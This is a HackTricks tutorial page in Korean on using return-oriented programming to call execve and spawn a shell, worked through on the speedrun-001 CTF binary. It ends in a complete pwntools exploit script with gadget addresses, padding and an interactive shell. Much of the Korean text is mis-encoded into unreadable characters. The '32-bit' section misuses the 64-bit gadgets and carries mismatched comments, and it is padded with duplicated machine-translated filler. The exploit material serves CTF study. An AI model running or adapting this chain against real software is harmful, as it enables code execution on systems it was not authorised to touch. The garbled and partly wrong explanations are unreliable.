# ROP - sys\_execve í˜¸ì¶œ

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong>ì„ í†µí•´ AWS í•´í‚¹ì„ ì²˜ìŒë¶€í„° ì „ë¬¸ê°€ê¹Œì§€ ë°°ì›Œë³´ì„¸ìš”<strong>!</strong></summary>

HackTricksë¥¼ ì§€ì›í•˜ëŠ” ë‹¤ë¥¸ ë°©ë²•:

* **íšŒì‚¬ë¥¼ HackTricksì—ì„œ ê´‘ê³ í•˜ê±°ë‚˜ HackTricksë¥¼ PDFë¡œ ë‹¤ìš´ë¡œë“œ**í•˜ë ¤ë©´ [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)ë¥¼ í™•ì¸í•˜ì„¸ìš”!
* [**ê³µì‹ PEASS & HackTricks ìŠ¤ì›¨ê·¸**](https://peass.creator-spring.com)ë¥¼ ì–»ìœ¼ì„¸ìš”.
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)ë¥¼ ë°œê²¬í•˜ì„¸ìš”. ë…ì ì ì¸ [**NFTs**](https://opensea.io/collection/the-peass-family) ì»¬ë ‰ì…˜ì…ë‹ˆë‹¤.
* ğŸ’¬ [**Discord ê·¸ë£¹**](https://discord.gg/hRep4RUj7f) ë˜ëŠ” [**í…”ë ˆê·¸ë¨ ê·¸ë£¹**](https://t.me/peass)ì— **ì°¸ì—¬**í•˜ê±°ë‚˜ **Twitter** ğŸ¦ [**@hacktricks_live**](https://twitter.com/hacktricks_live)**ë¥¼** **íŒ”ë¡œìš°**í•˜ì„¸ìš”.
* **HackTricks**ì™€ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github ì €ì¥ì†Œì— PRì„ ì œì¶œí•˜ì—¬ ìì‹ ì˜ í•´í‚¹ ê¸°ë²•ì„ ê³µìœ í•˜ì„¸ìš”.

</details>

**syscall**ì„ í˜¸ì¶œí•˜ê¸° ìœ„í•´ ë‹¤ìŒ êµ¬ì„±ì´ í•„ìš”í•©ë‹ˆë‹¤:

* `rax: 59 sys_execve ì§€ì •`
* `rdi: "/bin/sh" íŒŒì¼ì„ ì‹¤í–‰í•  ìœ„ì¹˜ë¥¼ ì§€ì •`
* `rsi: 0 ì¸ìˆ˜ê°€ ì „ë‹¬ë˜ì§€ ì•ŠìŒì„ ì§€ì •`
* `rdx: 0 í™˜ê²½ ë³€ìˆ˜ê°€ ì „ë‹¬ë˜ì§€ ì•ŠìŒì„ ì§€ì •`

ë”°ë¼ì„œ, ê¸°ë³¸ì ìœ¼ë¡œ ë¬¸ìì—´ `/bin/sh`ë¥¼ ì–´ë”˜ê°€ì— ì‘ì„±í•œ ë‹¤ìŒ `syscall`ì„ ìˆ˜í–‰í•´ì•¼ í•©ë‹ˆë‹¤(ìŠ¤íƒì„ ì œì–´í•˜ê¸° ìœ„í•´ í•„ìš”í•œ íŒ¨ë”©ì„ ê³ ë ¤í•´ì•¼ í•¨).

## ë ˆì§€ìŠ¤í„° ì œì–´

**ë ˆì§€ìŠ¤í„°ë¥¼ ì œì–´í•˜ëŠ” ë°©ë²•**ì„ ì°¾ì•„ë´…ì‹œë‹¤:
```c
ROPgadget --binary speedrun-001 | grep -E "pop (rdi|rsi|rdx\rax) ; ret"
0x0000000000415664 : pop rax ; ret
0x0000000000400686 : pop rdi ; ret
0x00000000004101f3 : pop rsi ; ret
0x00000000004498b5 : pop rdx ; ret
```
ì´ ì£¼ì†Œë“¤ì„ ì‚¬ìš©í•˜ì—¬ **ìŠ¤íƒì— ë‚´ìš©ì„ ì‘ì„±í•˜ê³  ë ˆì§€ìŠ¤í„°ì—ë¡œë“œ**í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

## ë¬¸ìì—´ ì‘ì„±

### ì“°ê¸° ê°€ëŠ¥í•œ ë©”ëª¨ë¦¬

ë¨¼ì € ë©”ëª¨ë¦¬ì—ì„œ ì“°ê¸° ê°€ëŠ¥í•œ ì¥ì†Œë¥¼ ì°¾ì•„ì•¼í•©ë‹ˆë‹¤.
```bash
gef> vmmap
[ Legend:  Code | Heap | Stack ]
Start              End                Offset             Perm Path
0x0000000000400000 0x00000000004b6000 0x0000000000000000 r-x /home/kali/git/nightmare/modules/07-bof_static/dcquals19_speedrun1/speedrun-001
0x00000000006b6000 0x00000000006bc000 0x00000000000b6000 rw- /home/kali/git/nightmare/modules/07-bof_static/dcquals19_speedrun1/speedrun-001
0x00000000006bc000 0x00000000006e0000 0x0000000000000000 rw- [heap]
```
### ë¬¸ìì—´ ì‘ì„±

ê·¸ëŸ° ë‹¤ìŒ ì´ ì£¼ì†Œì— ì„ì˜ì˜ ë‚´ìš©ì„ ì‘ì„±í•˜ëŠ” ë°©ë²•ì„ ì°¾ì•„ì•¼ í•©ë‹ˆë‹¤.
```python
ROPgadget --binary speedrun-001 | grep " : mov qword ptr \["
mov qword ptr [rax], rdx ; ret #Write in the rax address the content of rdx
```
#### 32 ë¹„íŠ¸

##### ROP (Return Oriented Programming)

ROP (Return Oriented Programming)ì€ ê³µê²©ìê°€ ì‹¤í–‰ íë¦„ì„ ì¡°ì‘í•˜ê¸° ìœ„í•´ í”„ë¡œê·¸ë¨ì˜ ê¸°ì¡´ ì½”ë“œ ì¡°ê°ë“¤ì„ ì¬í™œìš©í•˜ëŠ” ê¸°ë²•ì…ë‹ˆë‹¤. ì´ ê¸°ë²•ì€ ì‹¤í–‰ ê°€ëŠ¥í•œ ì½”ë“œ ì¡°ê°ë“¤ì„ ì°¾ì•„ì„œ ìŠ¤íƒì— ì ì ˆí•œ ìˆœì„œë¡œ ë°°ì¹˜í•˜ê³ , ì´í›„ì—ëŠ” ì´ ì½”ë“œ ì¡°ê°ë“¤ì„ ì‹¤í–‰í•˜ì—¬ ì›í•˜ëŠ” ë™ì‘ì„ ìˆ˜í–‰í•©ë‹ˆë‹¤.

##### ì‹œìŠ¤í…œ í˜¸ì¶œ (syscall)

ì‹œìŠ¤í…œ í˜¸ì¶œì€ ìš´ì˜ ì²´ì œì˜ ê¸°ëŠ¥ì„ ì‚¬ìš©í•˜ê¸° ìœ„í•´ í”„ë¡œê·¸ë¨ì´ ìš´ì˜ ì²´ì œì— ìš”ì²­í•˜ëŠ” ë©”ì»¤ë‹ˆì¦˜ì…ë‹ˆë‹¤. ì‹œìŠ¤í…œ í˜¸ì¶œì€ í”„ë¡œê·¸ë¨ì´ ìš´ì˜ ì²´ì œì˜ ê¸°ëŠ¥ì„ ì‚¬ìš©í•  ìˆ˜ ìˆë„ë¡ í•˜ëŠ” ì¸í„°í˜ì´ìŠ¤ ì—­í• ì„ í•©ë‹ˆë‹¤. ì‹œìŠ¤í…œ í˜¸ì¶œì€ ë³´í†µ ë ˆì§€ìŠ¤í„°ì— íŠ¹ì • ê°’ì„ ì„¤ì •í•˜ê³ , ì†Œí”„íŠ¸ì›¨ì–´ ì¸í„°ëŸ½íŠ¸ë¥¼ ë°œìƒì‹œì¼œ ìš´ì˜ ì²´ì œì— ìš”ì²­ì„ ì „ë‹¬í•©ë‹ˆë‹¤.

##### execv ì‹œìŠ¤í…œ í˜¸ì¶œ

execv ì‹œìŠ¤í…œ í˜¸ì¶œì€ ìƒˆë¡œìš´ í”„ë¡œê·¸ë¨ì„ ì‹¤í–‰í•˜ê¸° ìœ„í•´ ì‚¬ìš©ë©ë‹ˆë‹¤. ì´ ì‹œìŠ¤í…œ í˜¸ì¶œì€ ì‹¤í–‰í•  í”„ë¡œê·¸ë¨ì˜ ê²½ë¡œì™€ ì¸ìˆ˜ë¥¼ ì¸ìë¡œ ë°›ì•„ì„œ í•´ë‹¹ í”„ë¡œê·¸ë¨ì„ ì‹¤í–‰í•©ë‹ˆë‹¤. execv ì‹œìŠ¤í…œ í˜¸ì¶œì€ ìƒˆë¡œìš´ í”„ë¡œê·¸ë¨ì˜ ì‹¤í–‰ íë¦„ì„ í˜„ì¬ í”„ë¡œì„¸ìŠ¤ì—ì„œ ìƒˆë¡œìš´ í”„ë¡œì„¸ìŠ¤ë¡œ ì „í™˜ì‹œí‚µë‹ˆë‹¤.

##### ROPë¥¼ ì‚¬ìš©í•œ execv ì‹œìŠ¤í…œ í˜¸ì¶œ

ROPë¥¼ ì‚¬ìš©í•˜ì—¬ execv ì‹œìŠ¤í…œ í˜¸ì¶œì„ ìˆ˜í–‰í•˜ëŠ” ë°©ë²•ì€ ë‹¤ìŒê³¼ ê°™ìŠµë‹ˆë‹¤.

1. í•„ìš”í•œ ì¸ìë“¤ì„ ìŠ¤íƒì— ì ì ˆí•œ ìˆœì„œë¡œ ë°°ì¹˜í•©ë‹ˆë‹¤.
2. execv ì‹œìŠ¤í…œ í˜¸ì¶œì˜ ë²ˆí˜¸ë¥¼ eax ë ˆì§€ìŠ¤í„°ì— ì„¤ì •í•©ë‹ˆë‹¤.
3. ì†Œí”„íŠ¸ì›¨ì–´ ì¸í„°ëŸ½íŠ¸ë¥¼ ë°œìƒì‹œì¼œ execv ì‹œìŠ¤í…œ í˜¸ì¶œì„ ì‹¤í–‰í•©ë‹ˆë‹¤.

ì´ë ‡ê²Œ í•˜ë©´ ROPë¥¼ ì‚¬ìš©í•˜ì—¬ execv ì‹œìŠ¤í…œ í˜¸ì¶œì„ ìˆ˜í–‰í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.
```python
'''
Lets write "/bin/sh" to 0x6b6000

pop rdx, 0x2f62696e2f736800
pop rax, 0x6b6000
mov qword ptr [rax], rdx
'''

rop += popRdx           # place value into EAX
rop += "/bin"           # 4 bytes at a time
rop += popRax           # place value into edx
rop += p32(0x6b6000)    # Writable memory
rop += writeGadget   #Address to: mov qword ptr [rax], rdx

rop += popRdx
rop += "//sh"
rop += popRax
rop += p32(0x6b6000 + 4)
rop += writeGadget
```
#### 64 ë¹„íŠ¸

##### ROP (Return Oriented Programming)

ROP (Return Oriented Programming)ì€ ê³µê²©ìê°€ ì‹¤í–‰ íë¦„ì„ ì¡°ì‘í•˜ê¸° ìœ„í•´ í”„ë¡œê·¸ë¨ì˜ ê¸°ì¡´ ì½”ë“œ ì¡°ê°ë“¤ì„ ì¬í™œìš©í•˜ëŠ” ê¸°ë²•ì…ë‹ˆë‹¤. ì´ ê¸°ë²•ì€ ì‹¤í–‰ ê°€ëŠ¥í•œ ì½”ë“œ ì¡°ê°ë“¤ì„ ì°¾ì•„ì„œ ìŠ¤íƒì— ì ì ˆí•œ ìˆœì„œë¡œ ë°°ì¹˜í•˜ì—¬ ê³µê²©ìê°€ ì›í•˜ëŠ” ëª…ë ¹ì„ ì‹¤í–‰í•˜ë„ë¡ í•©ë‹ˆë‹¤.

##### ì‹œìŠ¤í…œ í˜¸ì¶œ (Syscall)

ì‹œìŠ¤í…œ í˜¸ì¶œì€ ìš´ì˜ ì²´ì œì˜ ê¸°ëŠ¥ì„ ì‚¬ìš©í•˜ê¸° ìœ„í•´ í”„ë¡œê·¸ë¨ì´ ìš´ì˜ ì²´ì œì— ìš”ì²­í•˜ëŠ” ë©”ì»¤ë‹ˆì¦˜ì…ë‹ˆë‹¤. ì‹œìŠ¤í…œ í˜¸ì¶œì€ í”„ë¡œê·¸ë¨ì´ ìš´ì˜ ì²´ì œì˜ ê¸°ëŠ¥ì„ ì‚¬ìš©í•˜ì—¬ íŒŒì¼ì„ ì—´ê±°ë‚˜ ì½ê³  ì“°ëŠ” ë“±ì˜ ì‘ì—…ì„ ìˆ˜í–‰í•  ìˆ˜ ìˆê²Œ í•´ì¤ë‹ˆë‹¤.

##### execv ì‹œìŠ¤í…œ í˜¸ì¶œ

execv ì‹œìŠ¤í…œ í˜¸ì¶œì€ ìƒˆë¡œìš´ í”„ë¡œê·¸ë¨ì„ ì‹¤í–‰í•˜ëŠ” ë° ì‚¬ìš©ë©ë‹ˆë‹¤. ì´ ì‹œìŠ¤í…œ í˜¸ì¶œì€ ìƒˆë¡œìš´ í”„ë¡œê·¸ë¨ì˜ ê²½ë¡œì™€ ì¸ìˆ˜ë¥¼ ì „ë‹¬í•˜ì—¬ ì‹¤í–‰í•©ë‹ˆë‹¤. ì´ë¥¼ í†µí•´ ê³µê²©ìëŠ” ì‹œìŠ¤í…œì—ì„œ ì„ì˜ì˜ ëª…ë ¹ì„ ì‹¤í–‰í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

##### ROPë¥¼ ì‚¬ìš©í•œ execv ì‹œìŠ¤í…œ í˜¸ì¶œ

ROPë¥¼ ì‚¬ìš©í•˜ì—¬ execv ì‹œìŠ¤í…œ í˜¸ì¶œì„ ìˆ˜í–‰í•˜ëŠ” ë°©ë²•ì€ ë‹¤ìŒê³¼ ê°™ìŠµë‹ˆë‹¤.

1. í•„ìš”í•œ ì‹œìŠ¤í…œ í˜¸ì¶œ ë²ˆí˜¸ë¥¼ ì°¾ìŠµë‹ˆë‹¤.
2. í•„ìš”í•œ ì¸ìˆ˜ë¥¼ ìŠ¤íƒì— ì ì ˆí•œ ìˆœì„œë¡œ ë°°ì¹˜í•©ë‹ˆë‹¤.
3. ROP ì²´ì¸ì„ ìƒì„±í•˜ì—¬ execv ì‹œìŠ¤í…œ í˜¸ì¶œì„ ìˆ˜í–‰í•©ë‹ˆë‹¤.

ì´ë¥¼ í†µí•´ ê³µê²©ìëŠ” ì„ì˜ì˜ í”„ë¡œê·¸ë¨ì„ ì‹¤í–‰í•˜ê±°ë‚˜ ì‹œìŠ¤í…œì—ì„œ ì›í•˜ëŠ” ëª…ë ¹ì„ ì‹¤í–‰í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.
```python
'''
Lets write "/bin/sh" to 0x6b6000

pop rdx, 0x2f62696e2f736800
pop rax, 0x6b6000
mov qword ptr [rax], rdx
'''
rop = ''
rop += popRdx
rop += "/bin/sh\x00" # The string "/bin/sh" in hex with a null byte at the end
rop += popRax
rop += p64(0x6b6000) # Writable memory
rop += writeGadget #Address to: mov qword ptr [rax], rdx
```
## ì˜ˆì œ

Let's consider a simple example to understand how to use ROP to execute a `execve` syscall in Linux.

ìš°ë¦¬ëŠ” ë¦¬ëˆ…ìŠ¤ì—ì„œ `execve` ì‹œìŠ¤ì½œì„ ì‹¤í–‰í•˜ê¸° ìœ„í•´ ROPë¥¼ ì‚¬ìš©í•˜ëŠ” ë°©ë²•ì„ ì´í•´í•˜ê¸° ìœ„í•´ ê°„ë‹¨í•œ ì˜ˆì œë¥¼ ì‚´í´ë³´ê² ìŠµë‹ˆë‹¤.

Assume we have a vulnerable program with a buffer overflow vulnerability. The vulnerable program takes user input and copies it into a buffer without proper bounds checking.

ì·¨ì•½í•œ í”„ë¡œê·¸ë¨ì´ ìˆëŠ” ê²ƒìœ¼ë¡œ ê°€ì •í•´ë´…ì‹œë‹¤. ì´ ì·¨ì•½í•œ í”„ë¡œê·¸ë¨ì€ ì‚¬ìš©ì ì…ë ¥ì„ ë°›ì•„ ì ì ˆí•œ ê²½ê³„ ê²€ì‚¬ ì—†ì´ ë²„í¼ì— ë³µì‚¬í•©ë‹ˆë‹¤.

Our goal is to exploit this vulnerability and execute the `execve` syscall to spawn a shell.

ìš°ë¦¬ì˜ ëª©í‘œëŠ” ì´ ì·¨ì•½ì ì„ ì´ìš©í•˜ì—¬ `execve` ì‹œìŠ¤ì½œì„ ì‹¤í–‰í•˜ì—¬ ì‰˜ì„ ìƒì„±í•˜ëŠ” ê²ƒì…ë‹ˆë‹¤.

To achieve this, we need to construct a ROP chain that will set up the necessary registers for the `execve` syscall and then trigger the syscall.

ì´ë¥¼ ìœ„í•´, `execve` ì‹œìŠ¤ì½œì„ ìœ„í•´ í•„ìš”í•œ ë ˆì§€ìŠ¤í„°ë¥¼ ì„¤ì •í•˜ê³  ì‹œìŠ¤ì½œì„ íŠ¸ë¦¬ê±°í•  ìˆ˜ ìˆëŠ” ROP ì²´ì¸ì„ êµ¬ì„±í•´ì•¼ í•©ë‹ˆë‹¤.

First, we need to find the addresses of the gadgets we will use in our ROP chain. We can use tools like `ROPgadget` or `ropper` to search for gadgets in the binary.

ë¨¼ì €, ROP ì²´ì¸ì—ì„œ ì‚¬ìš©í•  ê°€ì ¯ë“¤ì˜ ì£¼ì†Œë¥¼ ì°¾ì•„ì•¼ í•©ë‹ˆë‹¤. `ROPgadget`ì´ë‚˜ `ropper`ì™€ ê°™ì€ ë„êµ¬ë¥¼ ì‚¬ìš©í•˜ì—¬ ì´ì§„ íŒŒì¼ì—ì„œ ê°€ì ¯ì„ ê²€ìƒ‰í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

Once we have the addresses of the gadgets, we can start constructing our ROP chain. The ROP chain will consist of a series of gadgets that will manipulate the stack and set up the necessary registers.

ê°€ì ¯ì˜ ì£¼ì†Œë¥¼ ì–»ìœ¼ë©´ ROP ì²´ì¸ì„ êµ¬ì„±í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. ROP ì²´ì¸ì€ ìŠ¤íƒì„ ì¡°ì‘í•˜ê³  í•„ìš”í•œ ë ˆì§€ìŠ¤í„°ë¥¼ ì„¤ì •í•˜ëŠ” ì¼ë ¨ì˜ ê°€ì ¯ìœ¼ë¡œ êµ¬ì„±ë©ë‹ˆë‹¤.

Here is an example ROP chain that sets up the necessary registers for the `execve` syscall:

ë‹¤ìŒì€ `execve` ì‹œìŠ¤ì½œì„ ìœ„í•´ í•„ìš”í•œ ë ˆì§€ìŠ¤í„°ë¥¼ ì„¤ì •í•˜ëŠ” ì˜ˆì œ ROP ì²´ì¸ì…ë‹ˆë‹¤:

```assembly
pop rdi; ret
/bin/sh\x00
pop rsi; ret
NULL
pop rdx; ret
NULL
pop rax; ret
0x3b
syscall
```

In this example, we are using the `pop` gadgets to set the values of the registers `rdi`, `rsi`, `rdx`, and `rax`. We set `rdi` to the address of the string "/bin/sh\x00", `rsi` and `rdx` to NULL, and `rax` to 0x3b (the syscall number for `execve`).

ì´ ì˜ˆì œì—ì„œëŠ” `pop` ê°€ì ¯ì„ ì‚¬ìš©í•˜ì—¬ `rdi`, `rsi`, `rdx`, `rax` ë ˆì§€ìŠ¤í„°ì˜ ê°’ì„ ì„¤ì •í•©ë‹ˆë‹¤. `rdi`ë¥¼ ë¬¸ìì—´ "/bin/sh\x00"ì˜ ì£¼ì†Œë¡œ ì„¤ì •í•˜ê³ , `rsi`ì™€ `rdx`ë¥¼ NULLë¡œ ì„¤ì •í•˜ë©°, `rax`ë¥¼ `execve`ì˜ ì‹œìŠ¤ì½œ ë²ˆí˜¸ì¸ 0x3bë¡œ ì„¤ì •í•©ë‹ˆë‹¤.

After setting up the registers, we trigger the syscall instruction to execute the `execve` syscall.

ë ˆì§€ìŠ¤í„°ë¥¼ ì„¤ì •í•œ í›„, ì‹œìŠ¤ì½œ ëª…ë ¹ì„ íŠ¸ë¦¬ê±°í•˜ì—¬ `execve` ì‹œìŠ¤ì½œì„ ì‹¤í–‰í•©ë‹ˆë‹¤.

By constructing and executing this ROP chain, we can exploit the buffer overflow vulnerability and spawn a shell.

ì´ ROP ì²´ì¸ì„ êµ¬ì„±í•˜ê³  ì‹¤í–‰í•¨ìœ¼ë¡œì¨ ë²„í¼ ì˜¤ë²„í”Œë¡œ ì·¨ì•½ì ì„ ì´ìš©í•˜ê³  ì‰˜ì„ ìƒì„±í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.
```python
from pwn import *

target = process('./speedrun-001')
#gdb.attach(target, gdbscript = 'b *0x400bad')

# Establish our ROP Gadgets
popRax = p64(0x415664)
popRdi = p64(0x400686)
popRsi = p64(0x4101f3)
popRdx = p64(0x4498b5)

# 0x000000000048d251 : mov qword ptr [rax], rdx ; ret
writeGadget = p64(0x48d251)

# Our syscall gadget
syscall = p64(0x40129c)

'''
Here is the assembly equivalent for these blocks
write "/bin/sh" to 0x6b6000

pop rdx, 0x2f62696e2f736800
pop rax, 0x6b6000
mov qword ptr [rax], rdx
'''
rop = ''
rop += popRdx
rop += "/bin/sh\x00" # The string "/bin/sh" in hex with a null byte at the end
rop += popRax
rop += p64(0x6b6000)
rop += writeGadget

'''
Prep the four registers with their arguments, and make the syscall

pop rax, 0x3b
pop rdi, 0x6b6000
pop rsi, 0x0
pop rdx, 0x0

syscall
'''

rop += popRax
rop += p64(0x3b)

rop += popRdi
rop += p64(0x6b6000)

rop += popRsi
rop += p64(0)
rop += popRdx
rop += p64(0)

rop += syscall


# Add the padding to the saved return address
payload = "0"*0x408 + rop

# Send the payload, drop to an interactive shell to use our new shell
target.sendline(payload)

target.interactive()
```
## ì°¸ê³  ìë£Œ

* [https://guyinatuxedo.github.io/07-bof\_static/dcquals19\_speedrun1/index.html](https://guyinatuxedo.github.io/07-bof\_static/dcquals19\_speedrun1/index.html)

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong>ë¥¼ í†µí•´ AWS í•´í‚¹ì„ ì²˜ìŒë¶€í„° ì „ë¬¸ê°€ê¹Œì§€ ë°°ì›Œë³´ì„¸ìš”<strong>!</strong></summary>

HackTricksë¥¼ ì§€ì›í•˜ëŠ” ë‹¤ë¥¸ ë°©ë²•:

* **íšŒì‚¬ë¥¼ HackTricksì—ì„œ ê´‘ê³ í•˜ê±°ë‚˜ HackTricksë¥¼ PDFë¡œ ë‹¤ìš´ë¡œë“œ**í•˜ë ¤ë©´ [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)ë¥¼ í™•ì¸í•˜ì„¸ìš”!
* [**ê³µì‹ PEASS & HackTricks ìƒí’ˆ**](https://peass.creator-spring.com)ì„ êµ¬ë§¤í•˜ì„¸ìš”.
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)ë¥¼ ë°œê²¬í•˜ì„¸ìš”. ë…ì ì ì¸ [**NFT**](https://opensea.io/collection/the-peass-family) ì»¬ë ‰ì…˜ì…ë‹ˆë‹¤.
* ğŸ’¬ [**Discord ê·¸ë£¹**](https://discord.gg/hRep4RUj7f) ë˜ëŠ” [**í…”ë ˆê·¸ë¨ ê·¸ë£¹**](https://t.me/peass)ì— **ì°¸ì—¬**í•˜ê±°ë‚˜ **Twitter** ğŸ¦ [**@hacktricks_live**](https://twitter.com/hacktricks_live)ë¥¼ **íŒ”ë¡œìš°**í•˜ì„¸ìš”.
* **HackTricks**ì™€ **HackTricks Cloud** github ì €ì¥ì†Œì— PRì„ ì œì¶œí•˜ì—¬ ì—¬ëŸ¬ë¶„ì˜ í•´í‚¹ ê¸°ë²•ì„ ê³µìœ í•˜ì„¸ìš”.

</details>
